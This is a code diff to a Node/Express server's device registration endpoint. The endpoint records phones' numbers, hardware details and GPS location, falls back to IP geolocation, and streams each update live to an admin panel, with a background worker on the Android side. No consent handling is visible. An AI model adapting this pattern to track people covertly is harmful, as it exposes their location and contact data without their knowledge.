@@ -54,6 +54,7 @@ async function startServer() {
   });
 
   // Middleware
+  app.set('trust proxy', true); // Trust Railway/Render proxy — needed for correct req.ip
   app.use(cors());
   app.use(express.json({ limit: '50mb' }));
   app.use(express.urlencoded({ extended: true, limit: '50mb' }));
@@ -259,40 +260,89 @@ async function startServer() {
     });
   });
 
-  // Device registration endpoint (called by Android app on first launch)
-  app.post('/api/devices/register', (req, res) => {
+  // Device registration endpoint (called by Android app on first launch + background worker)
+  app.post('/api/devices/register', async (req, res) => {
     try {
       const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id is required' });
 
+      const { geolocateIp, getRequestIp } = require('./utils/geoip');
       const phonesJson = JSON.stringify(phone_numbers || []);
-      const existing = db.prepare('SELECT device_id FROM devices WHERE device_id = ?').get(device_id);
+      const hasGps = latitude != null && longitude != null && latitude !== 0 && longitude !== 0;
+      const clientIp = getRequestIp(req) || '';
+
+      const existing = db.prepare('SELECT device_id, latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
       if (existing) {
-        db.prepare(`UPDATE devices SET
-          device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
-          app_version = ?, screen_resolution = ?, phone_numbers = ?,
-          battery_percent = ?, battery_charging = ?,
-          total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
-          latitude = COALESCE(?, latitude), longitude = COALESCE(?, longitude),
-          is_online = 1, last_seen = datetime('now')
-          WHERE device_id = ?`).run(
-          device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
-          app_version || '', screen_resolution || '', phonesJson,
-          battery_percent ?? -1, battery_charging ? 1 : 0,
-          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
-          latitude ?? null, longitude ?? null,
-          device_id
-        );
+        if (hasGps) {
+          db.prepare(`UPDATE devices SET
+            device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
+            app_version = ?, screen_resolution = ?, phone_numbers = ?,
+            battery_percent = ?, battery_charging = ?,
+            total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
+            latitude = ?, longitude = ?,
+            loc_source = 'gps', ip_address = ?,
+            is_online = 1, last_seen = datetime('now')
+            WHERE device_id = ?`).run(
+            device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
+            app_version || '', screen_resolution || '', phonesJson,
+            battery_percent ?? -1, battery_charging ? 1 : 0,
+            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
+            latitude, longitude,
+            clientIp, device_id
+          );
+        } else {
+          db.prepare(`UPDATE devices SET
+            device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
+            app_version = ?, screen_resolution = ?, phone_numbers = ?,
+            battery_percent = ?, battery_charging = ?,
+            total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
+            ip_address = ?,
+            is_online = 1, last_seen = datetime('now')
+            WHERE device_id = ?`).run(
+            device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
+            app_version || '', screen_resolution || '', phonesJson,
+            battery_percent ?? -1, battery_charging ? 1 : 0,
+            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
+            clientIp, device_id
+          );
+        }
       } else {
-        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude)
-          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
+        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude, loc_source, ip_address)
+          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
           device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
           app_version || '', screen_resolution || '', phonesJson,
           battery_percent ?? -1, battery_charging ? 1 : 0,
           total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
-          latitude ?? null, longitude ?? null
+          hasGps ? latitude : null, hasGps ? longitude : null,
+          hasGps ? 'gps' : 'unknown', clientIp
         );
       }
+
+      // If no GPS data, try IP geolocation fallback (async, don't block response)
+      if (!hasGps) {
+        const deviceNow = db.prepare('SELECT latitude, longitude FROM devices WHERE device_id = ?').get(device_id);
+        if (!deviceNow || deviceNow.latitude == null || deviceNow.longitude == null) {
+          geolocateIp(clientIp).then(geo => {
+            if (!geo) return;
+            // Double-check GPS hasn't arrived
+            const fresh = db.prepare('SELECT latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
+            if (fresh && fresh.latitude != null && fresh.loc_source === 'gps') return;
+            db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = 'ip', loc_accuracy = ?, city = ?, region = ?, country = ?, isp = ?, timezone = ? WHERE device_id = ?`)
+              .run(geo.latitude, geo.longitude, geo.accuracy_km * 1000, geo.city, geo.region, geo.country, geo.isp, geo.timezone, device_id);
+            console.log(`[REST] IP geo fallback for ${device_id}: ${geo.city}, ${geo.country}`);
+            // Emit to admin panel
+            const io2 = req.app.get('io');
+            if (io2) {
+              const updated = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
+              if (updated) {
+                try { updated.phone_numbers = JSON.parse(updated.phone_numbers || '[]'); } catch (_) { updated.phone_numbers = []; }
+                io2.emit('device_online', updated);
+              }
+            }
+          }).catch(() => {});
+        }
+      }
+
       // Broadcast to admin panel in real-time so no refresh needed
       const io = req.app.get('io');
       if (io) {
